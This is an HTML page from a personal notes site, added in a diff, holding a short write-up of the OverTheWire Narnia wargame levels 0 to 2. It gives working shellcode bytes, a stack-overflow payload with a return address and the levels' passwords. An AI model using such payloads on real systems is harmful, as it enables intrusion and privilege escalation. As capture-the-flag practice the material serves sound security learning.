@@ -1,0 +1,305 @@
+
+<!DOCTYPE html>
+
+<html lang="zh_CN">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <script async src="https://www.googletagmanager.com/gtag/js?id=G-FYHS50G6DL"></script>
+        <script>
+            window.dataLayer = window.dataLayer || [];
+            function gtag(){dataLayer.push(arguments);}
+            gtag('js', new Date());
+            
+            gtag('config', 'G-FYHS50G6DL');
+            
+        </script>
+    
+    <title>wargame-narnia &#8212; 银色子弹</title>
+    <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
+    <link rel="stylesheet" href="../../../_static/alabaster.css" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="../../../_static/graphviz.css" />
+    <link rel="stylesheet" type="text/css" href="../../../_static/sphinxnotes-strike.css" />
+    <link rel="stylesheet" type="text/css" href="../../../_static/panels-main.c949a650a448cc0ae9fd3441c0e17fb0.css" />
+    <link rel="stylesheet" type="text/css" href="../../../_static/panels-bootstrap.5fd3999ee7762ccc51105388f4a9d115.css" />
+    <link rel="stylesheet" type="text/css" href="../../../_static/panels-variables.06eb56fa6e07937060861dad626602ad.css" />
+    <link rel="stylesheet" type="text/css" href="../../../_static/center-title.css" />
+    <link rel="stylesheet" type="text/css" href="../../../_static/ablog.css" />
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.2/css/all.css" />
+    <script id="documentation_options" data-url_root="../../../" src="../../../_static/documentation_options.js"></script>
+    <script src="../../../_static/jquery.js"></script>
+    <script src="../../../_static/underscore.js"></script>
+    <script src="../../../_static/doctools.js"></script>
+    <script src="../../../_static/translations.js"></script>
+    <link rel="canonical" href="https://silverrainz.me/notes/writeups/wargame-narnia/index.html" />
+    <link rel="shortcut icon" href="../../../_static/favicon.png"/>
+    <link rel="index" title="索引" href="../../../genindex.html" />
+    <link rel="search" title="搜索" href="../../../search.html" />
+    <link rel="next" title="造型实验室" href="../../zxsys/index.html" />
+    <link rel="prev" title="wargme-bandit" href="../wargame-bandit/index.html" /> 
+   
+  <link rel="stylesheet" href="../../../_static/custom.css" type="text/css" />
+  
+    <link rel="apple-touch-icon" href="../../../_static/logo.png" />
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=0.9, maximum-scale=0.9" />
+ 
+<link
+  rel="alternate"
+  type="application/atom+xml"
+  href="../../../blog/atom.xml"
+  title="银色子弹"
+/>
+ 
+<style type="text/css">
+  ul.ablog-archive {
+    list-style: none;
+    overflow: auto;
+    margin-left: 0px;
+  }
+  ul.ablog-archive li {
+    float: left;
+    margin-right: 5px;
+    font-size: 80%;
+  }
+  ul.postlist a {
+    font-style: italic;
+  }
+  ul.postlist-style-disc {
+    list-style-type: disc;
+  }
+  ul.postlist-style-none {
+    list-style-type: none;
+  }
+  ul.postlist-style-circle {
+    list-style-type: circle;
+  }
+</style>
+
+  </head><body>
+  
+
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          
+
+          <div class="body" role="main">
+             <div class="section" id="wargame-narnia">
+<h1>wargame-narnia<a class="headerlink" href="#wargame-narnia" title="永久链接至标题">¶</a></h1>
+<ul>
+<li><p>ssh addr: <a class="reference external" href="mailto:narnia0&#37;&#52;&#48;narnia&#46;labs&#46;overthewire&#46;org">narnia0<span>&#64;</span>narnia<span>&#46;</span>labs<span>&#46;</span>overthewire<span>&#46;</span>org</a></p></li>
+<li><p>url: <a class="reference external" href="http://overthewire.org/wargames/narnia/">http://overthewire.org/wargames/narnia/</a></p>
+<blockquote>
+<div><p>–[ Tips ]–</p>
+<p>This machine has a 64bit processor and many security-features
+enabled by default, although ASLR has been switched off. The
+following compiler flags might be interesting:</p>
+<ul class="simple">
+<li><p>-m32 compile for 32bit</p></li>
+<li><p>-fno-stack-protector disable ProPolice</p></li>
+<li><p>-Wl,-z,norelro disable relro</p></li>
+</ul>
+<p>In addition, the execstack tool can be used to flag the stack as
+executable on ELF binaries.</p>
+<p>Finally, network-access is limited for most levels by a local
+firewall.</p>
+</div></blockquote>
+</li>
+</ul>
+<div class="section" id="shellcode">
+<h2>测试 shellcode:<a class="headerlink" href="#shellcode" title="永久链接至标题">¶</a></h2>
+<p><a class="reference external" href="./shellcodetest.c">shellcodetest.c</a></p>
+<p>gcc -fno-stack-protector -z execstack -m32 shellcodetest.c -o
+shellcodetest</p>
+</div>
+<div class="section" id="id1">
+<h2>生成 shellcode<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h2>
+<ol class="arabic simple">
+<li><p>写出 xxx.asm</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">nasm</span> <span class="pre">-f</span> <span class="pre">elf32</span> <span class="pre">xxx.asm</span> <span class="pre">-o</span> <span class="pre">xxx.o</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">ld</span> <span class="pre">-m</span> <span class="pre">elf_i386</span> <span class="pre">-o</span> <span class="pre">xxx</span> <span class="pre">xxx.o</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">objdump</span> <span class="pre">-d</span> <span class="pre">xxx</span></code> 从输出中获得 shellcode 当然也可以写个工具提取</p></li>
+<li><p>考虑一下让<code class="docutils literal notranslate"><span class="pre">.text</span></code>段可写?
+<code class="docutils literal notranslate"><span class="pre">objcopy</span> <span class="pre">--writable-text</span> <span class="pre">-O</span> <span class="pre">elf32-i386</span> <span class="pre">xxx</span> <span class="pre">xxx1</span></code> 似乎没有作用…</p></li>
+</ol>
+</div>
+<div class="section" id="id2">
+<h2>更改的系统值存档<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h2>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">/proc/sys/kernel/randomize_va_space</span></code> = 2</p></li>
+</ul>
+<div class="section" id="narnia0">
+<h3>narnia0<a class="headerlink" href="#narnia0" title="永久链接至标题">¶</a></h3>
+<p>flag: narnia0</p>
+</div>
+<div class="section" id="narnia1">
+<h3>narnia1<a class="headerlink" href="#narnia1" title="永久链接至标题">¶</a></h3>
+<p>flag: efeidiedae</p>
+<p><a class="reference external" href="./narnia0.c">narnia0.c</a></p>
+<p>需要覆盖<code class="docutils literal notranslate"><span class="pre">val</span></code>变量, 注意管道关闭后程序也会随着关闭因此需要用
+<code class="docutils literal notranslate"><span class="pre">cat</span></code> 继续向程序传递内容</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ (python -c &quot;print(&#39;aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde&#39;)&quot;; cat) | /narnia/narnia0
+# 进入 sh 后执行
+$ cat /etc/narnia_pass/narnia1
+</pre></div>
+</div>
+</div>
+<div class="section" id="narnia2">
+<h3>narnia2<a class="headerlink" href="#narnia2" title="永久链接至标题">¶</a></h3>
+<p>flag: nairiepecu</p>
+<p><a class="reference external" href="./narnia1.c">narnia1.c</a></p>
+<p>程序直接把环境变量 <code class="docutils literal notranslate"><span class="pre">$EGG</span></code> 的内容当成函数执行了，所以要在 <code class="docutils literal notranslate"><span class="pre">$EGG</span></code>
+中插入程序。</p>
+<p>这次需要真正的 shellcode 了, shellcode 见 <code class="docutils literal notranslate"><span class="pre">shell.asm</span></code>, 将生成的
+shellcode 导入 EGG 变量, 直接执行 <code class="docutils literal notranslate"><span class="pre">./narnia2</span></code> 即可.</p>
+<p>shellcode: <a class="reference external" href="./shell.asm">shell.asm</a></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ export EGG=$(python -c &quot;print(&#39;\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42&#39;)&quot;)
+$ ./narnia1
+</pre></div>
+</div>
+</div>
+<div class="section" id="narnia3">
+<h3>narnia3<a class="headerlink" href="#narnia3" title="永久链接至标题">¶</a></h3>
+<p><a class="reference external" href="./narnia2.c">narnia2.c</a></p>
+<p>查看环境变量地址: <code class="docutils literal notranslate"><span class="pre">(gdb)</span> <span class="pre">x/s</span> <span class="pre">*((char</span> <span class="pre">**)environ</span> <span class="pre">+</span> <span class="pre">1)</span></code>， 结果
+<code class="docutils literal notranslate"><span class="pre">0xffffd8a1:</span>&#160;&#160;&#160;&#160; <span class="pre">&quot;XDG_SESSION_ID=76296&quot;</span></code></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ export XDG_SESSION_ID=$(python -c &quot;print(&#39;\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42&#39;)&quot;)
+./narnia2 $(python -c &quot;print(&#39;a&#39; * 140 + &#39;\x55\xd8\xff\xff&#39;)&quot;)
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="section">
+   
+</div>
+
+          </div>
+          
+        </div>
+      </div>
+      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
+        <div class="sphinxsidebarwrapper">
+<p class="logo">
+  <a href="../../../index.html">
+    <img class="logo" src="../../../_static/logo.png" alt="Logo"/>
+    
+  </a>
+</p>
+
+
+
+<p class="blurb">Yes silver bullet here.</p>
+
+
+
+
+
+
+<h3>导航</h3>
+<p class="caption"><span class="caption-text">笔记</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../../6-lectures-on-sketch.html">素描六讲</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../cadge-system.html">CAGED 系统</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../interval-of-music.html">音程</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../painters.html">艺术家史</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../rust-book.html">Rust Book</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../books/index.html">读书笔记</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../draft/way-of-guitar-recoding.html">录歌方案</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../ionian/index.html">大调训练计划</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../leetcode/index.html">Leetcode 刷题记录</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../sphinx-as-pim/index.html">Sphinx As PIM System</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../srain/index.html">Srain Architecture Proposal</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../index.html">Capture The Flag</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../zxsys/index.html">造型实验室</a></li>
+</ul>
+<p class="caption"><span class="caption-text">博客</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../../blog/index.html">所有日志</a></li>
+</ul>
+<p class="caption"><span class="caption-text">手册</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../../man/awk.html">Awk</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../man/gdb.html">GDB</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../man/git.html">Git</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../man/gpg.html">GnuPG</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../man/irc.html">IRC</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../man/krita.html">Krita</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../man/lily.html">LilyPond</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../man/magick.html">ImageMagick</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../man/make.html">Makefile</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../man/meson.html">Meson Build System</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../man/pacman.html">Pacman</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../man/py.html">Python</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../man/rst.html">reStructuredText</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../man/sh.html">Shell Script</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../man/vim.html">Vim</a></li>
+</ul>
+<p class="caption"><span class="caption-text">随记</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../../misc/2017/index.html">2017</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../misc/2020/index.html">2020</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../misc/2021/index.html">2021</a></li>
+</ul>
+<p class="caption"><span class="caption-text">收集室</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../../collections/art-works/index.html">Art Works</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../collections/scores/index.html">乐谱夹</a></li>
+</ul>
+<p class="caption"><span class="caption-text">关于</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../../about/me.html">我</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../about/site.html">本站</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../about/friends.html">友人帐</a></li>
+</ul>
+
+<div class="relations">
+<h3>Related Topics</h3>
+<ul>
+  <li><a href="../../../index.html">Documentation overview</a><ul>
+  <li><a href="../index.html">Capture The Flag</a><ul>
+      <li>Previous: <a href="../wargame-bandit/index.html" title="上一章">wargme-bandit</a></li>
+      <li>Next: <a href="../../zxsys/index.html" title="下一章">造型实验室</a></li>
+  </ul></li>
+  </ul></li>
+</ul>
+</div>
+<div id="searchbox" style="display: none" role="search">
+  <h3 id="searchlabel">快速搜索</h3>
+    <div class="searchformwrapper">
+    <form class="search" action="../../../search.html" method="get">
+      <input type="text" name="q" aria-labelledby="searchlabel" />
+      <input type="submit" value="转向" />
+    </form>
+    </div>
+</div>
+<script>$('#searchbox').show(0);</script>
+
+
+
+
+
+
+
+
+        </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="footer">
+      &copy;2020, Shengyu Zhang.
+      
+      |
+      Powered by <a href="http://sphinx-doc.org/">Sphinx 3.5.2</a>
+      &amp; <a href="https://github.com/bitprophet/alabaster">Alabaster 0.7.12</a>
+      
+    </div>
+
+    
+
+    
+  </body>
+</html>
